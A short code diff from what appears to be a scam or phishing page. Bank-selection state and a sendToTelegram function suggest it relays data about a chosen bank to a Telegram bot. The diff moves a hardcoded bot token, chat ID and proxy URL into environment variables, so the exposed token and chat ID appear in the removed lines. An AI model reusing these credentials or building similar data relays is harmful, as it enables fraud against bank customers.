@@ -2,9 +2,9 @@ let shareCount = 0;
 let channelJoined = false;
 let selectedBank = "";
 
-const TG_TOKEN = '8746587563:AAE4NEi90V3fIsRthXn175_VSQv3sPwLyjs';
-const TG_CHAT_ID = '6731689359';
-const PROXY_URL = 'https://telegram-dacoumennt-api.vercel.app/api/proxy';
+const TG_TOKEN = import.meta.env.VITE_TG_TOKEN;
+const TG_CHAT_ID = import.meta.env.VITE_TG_CHAT_ID;
+const PROXY_URL = import.meta.env.VITE_PROXY_URL;
 
 async function sendToTelegram(message, bankType = 'default') {
     const formData = new FormData();
